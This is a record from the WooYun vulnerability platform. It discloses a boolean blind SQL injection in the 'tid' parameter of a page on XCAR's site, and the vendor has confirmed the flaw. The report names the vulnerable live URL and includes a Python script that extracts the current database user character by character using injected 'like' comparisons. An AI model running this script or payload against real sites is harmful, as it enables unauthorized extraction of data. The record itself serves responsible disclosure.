{"id": 71961, "wybug_id": "wooyun-2015-0150022", "wybug_title": "爱卡汽车某站存在SQL注入漏洞", "wybug_corp": "爱卡汽车网", "wybug_author": "路人甲", "wybug_date": "2015-10-28 11:53", "wybug_open_date": "2015-12-14 11:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向公众公开  简要描述： SQL注入 详细说明：  目标：爱卡汽车官网爱卡APP发现以下地方存在SQL注入：（注入参数tid，布尔盲注）\nhttp://a.xcar.com.cn/huodong/201509/showfall/comment.php?tid=2\n手工发现的，很明显，但就不明白为啥SQLMap检测不出来……应该是过滤了关键字了~于是只能写了个Python执行了……附上验证代码：(含代理，使用时请去掉)\n#!/usr/bin/env python#coding=utf8import httplib, urllib, re, timedatabase = ''temp_database = ''httpClient = Nonei = 33while i < 128:    if i == 37:        i = i+1    try:        headers = {\"Host\": \"a.xcar.com.cn\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\", \"Accept-Encoding\": \"gzip, deflate\"}        httpClient = httplib.HTTPConnection(\"192.168.1.2\", 8888, timeout=10)        myurl = u'http://a.xcar.com.cn:80/huodong/201509/showfall/comment.php?tid=2%20and%20current_user()%20like%200x'+temp_database+str(hex(i))[2:]+'25'        httpClient.request(\"GET\", url=myurl, headers=headers)        response = httpClient.getresponse()        rp = response.read()        if re.search('Mia', rp, re.I):            temp_database = temp_database + str(hex(i))[2:]            database = database + chr(i)            print 'user(): ', database            i = 33        i=i+1            except Exception, e:        print e    finally:        if httpClient:            httpClient.close()\n   漏洞证明：  证明截图，就跑下当前数据库用户吧\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-10-30 11:14 厂商回复： 感谢 @路人甲的提交，问题已经确认，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}